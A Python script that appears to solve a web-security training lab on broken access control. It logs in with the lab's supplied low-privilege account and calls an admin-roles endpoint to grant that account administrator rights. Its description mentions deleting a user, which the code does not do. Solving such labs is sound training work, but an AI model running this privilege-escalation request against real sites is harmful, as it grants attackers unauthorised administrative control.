#####################
#    Libraries      #
#####################
import requests
import sys
import urllib3
import argparse

#####################
#    Variables      #
#####################

## Disable requests warning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


## Setup Proxies for future debugs
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

parser = argparse.ArgumentParser(prog=f'\n[+] WebAcademy Access Control: Lab 6'
                                ,description="Description: Accesses the Admin Panel that has and unpredictable location\n and Delete Carlos' user"
                                ,epilog='----------------------- END ---------------------------')
parser.add_argument('-u', metavar ='--url', action='store', dest='url', type=str, required=True, help="Target's URL")
args = parser.parse_args()


#####################
#    Functions      #
#####################
def login(url,s):
    print("[+] Trying to log in as wiener user")
    login_url = url+"/login"
    
    #login as the wiener user
    data = {"username": "wiener",
            "password": "peter"}

    r = s.post(login_url, data=data, verify=False, proxies=proxies)
    res = r.text
    if "Log out" in res:
        print("[+] Successfully logged in as the wiener user.")  
        upgrade_user(url,s)
    else:
        print("[-] Failed to login as the wiener user.")
        sys.exit(-1)
        
def upgrade_user(url, s):
    print("[+] Trying to upgrade the Wiener's user")
    upgrade_user_url = url+"/admin-roles"
    params = {"username":"wiener",
            "action":"upgrade"}
    # Upgrade the wiener user
    r = s.get(upgrade_user_url, verify=False, params=params, proxies=proxies)
    if r.status_code == 200:
        print('[+] Successfully upgraded wiener\'s user.')
    else:
        print('[-] Failed to upgrade the user.')
        sys.exit(-1)
    

def main():
    if len(sys.argv) != 3:
        print(f"[+] Usage: {sys.argv[0]} -u <lab's url>")
        print(f"[+] Example: {sys.argv[0]} -u www.example.com")
        sys.exit(-1)

    url = args.url.rstrip('/')
    s = requests.Session()
    login(url,s)

if __name__ == "__main__":
    main()